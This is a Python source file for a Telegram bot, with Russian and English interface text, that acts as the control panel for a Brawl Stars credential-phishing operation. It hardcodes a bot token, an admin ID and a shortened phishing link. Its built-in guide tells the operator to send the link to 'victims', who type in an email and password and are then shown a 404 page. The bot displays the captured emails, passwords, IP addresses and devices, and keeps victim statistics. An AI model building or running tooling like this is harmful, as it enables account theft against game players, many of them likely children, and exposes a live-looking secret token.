import requests
import time
import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
ADMIN_ID = 8744429026
PHISHING_URL = "https://da.gd/tzO5QW"

last_update_id = 0
victims = []
user_language = {}

# ========== ТЕКСТЫ ==========
TEXTS = {
    'ru': {
        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
        'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку\n2️⃣ Жертва вводит почту и пароль\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит 404\n\n⚠️ Ссылка: {url}",
        'data_empty': "📭 **Нет данных**",
        'data_title': "👥 **Пойманные жертвы:**\n\n",
        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
        'donate': "✨ **ПОДДЕРЖАТЬ**\n\n⭐ 25⭐ ≈ 50₽\n⭐ 50⭐ ≈ 100₽\n⭐ 100⭐ ≈ 200₽",
        'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
        'lang_changed': "✅ Язык: Русский",
        'lang_changed_en': "✅ Language: English",
        'back': "🔙 Назад",
        'data_btn': "📋 Данные",
        'stats_btn': "📊 Статистика",
        'donate_btn': "⭐ Поддержать",
        'instruction_btn': "📖 Инструкция",
        'settings_btn': "⚙️ Настройки",
        'donate_25_btn': "⭐ 25⭐",
        'donate_50_btn': "⭐ 50⭐",
        'donate_100_btn': "⭐ 100⭐"
    },
    'en': {
        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.",
        'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link\n2️⃣ Victim enters email/password\n3️⃣ Data comes here\n4️⃣ Victim sees 404\n\n⚠️ Link: {url}",
        'data_empty': "📭 **No data**",
        'data_title': "👥 **Victims:**\n\n",
        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total: {total}\n🌐 Unique IPs: {unique}",
        'donate': "✨ **SUPPORT**\n\n⭐ 25⭐ ≈ €0.5\n⭐ 50⭐ ≈ €1\n⭐ 100⭐ ≈ €2",
        'settings': "⚙️ **SETTINGS**\n\nChoose language:",
        'lang_changed': "✅ Language: English",
        'lang_changed_ru': "✅ Язык: Русский",
        'back': "🔙 Back",
        'data_btn': "📋 Data",
        'stats_btn': "📊 Stats",
        'donate_btn': "⭐ Support",
        'instruction_btn': "📖 Guide",
        'settings_btn': "⚙️ Settings",
        'donate_25_btn': "⭐ 25⭐",
        'donate_50_btn': "⭐ 50⭐",
        'donate_100_btn': "⭐ 100⭐"
    }
}

def get_text(chat_id, key, **kwargs):
    lang = user_language.get(chat_id, 'ru')
    text = TEXTS[lang].get(key, TEXTS['ru'][key])
    return text.format(**kwargs) if kwargs else text

def get_button_text(chat_id, key):
    lang = user_language.get(chat_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def answer_callback(callback_id, text="", show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    requests.post(url, json=data)

def get_main_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}],
        [{"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}],
        [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}]
    ]

def get_donate_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'donate_25_btn'), "url": "https://t.me/telegram?start=star25"}, {"text": get_button_text(chat_id, 'donate_50_btn'), "url": "https://t.me/telegram?start=star50"}],
        [{"text": get_button_text(chat_id, 'donate_100_btn'), "url": "https://t.me/telegram?start=star100"}],
        [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
    ]

def get_back_keyboard(chat_id):
    return [[{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]]

def get_language_keyboard():
    return [
        [{"text": "🇷🇺 Русский", "callback_data": "lang_ru"}],
        [{"text": "🇬🇧 English", "callback_data": "lang_en"}],
        [{"text": "⬅️ Назад", "callback_data": "back"}]
    ]

# === ВЕБ-СЕРВЕР ДЛЯ RENDER (чтобы порт был открыт) ===
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running')

def run_health_server():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    server.serve_forever()

threading.Thread(target=run_health_server, daemon=True).start()

print("✅ Бот запущен на Render.com!")
print(f"🔗 Ссылка: {PHISHING_URL}")

# === ОСНОВНОЙ ЦИКЛ БОТА ===
while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
        response = requests.get(url).json()

        for update in response.get("result", []):
            last_update_id = update["update_id"]
            message = update.get("message", {})
            callback = update.get("callback_query", {})

            if message:
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")
                if chat_id != ADMIN_ID:
                    send_message(chat_id, "❌ Доступ запрещён")
                    continue
                if text == "/start":
                    user_language[chat_id] = 'ru'
                    send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))

            if callback:
                chat_id = callback.get("from", {}).get("id")
                data = callback.get("data")
                callback_id = callback.get("id")
                message_id = callback.get("message", {}).get("message_id")

                if chat_id != ADMIN_ID:
                    answer_callback(callback_id, "❌ Доступ запрещён", True)
                    continue

                if data == "back":
                    edit_message(chat_id, message_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "donate_menu":
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "instruction":
                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "settings":
                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard())
                    answer_callback(callback_id)

                elif data == "lang_ru":
                    user_language[chat_id] = 'ru'
                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed'), get_back_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "lang_en":
                    user_language[chat_id] = 'en'
                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed_en'), get_back_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "data":
                    if not victims:
                        edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
                    else:
                        txt = get_text(chat_id, 'data_title')
                        for v in victims[-30:]:
                            txt += f"📧 {v['email']}\n🔑 {v['password']}\n📡 {v['ip']}\n📱 {v['device']}\n⏰ {v['time']}\n"
                            txt += "─" * 30 + "\n"
                        if len(txt) > 4000:
                            txt = txt[:3900] + "\n...(обрезано)"
                        edit_message(chat_id, message_id, txt, get_back_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "stats":
                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
                    answer_callback(callback_id)

        time.sleep(1)

    except Exception as e:
        print(f"Ошибка: {e}")
        time.sleep(5)
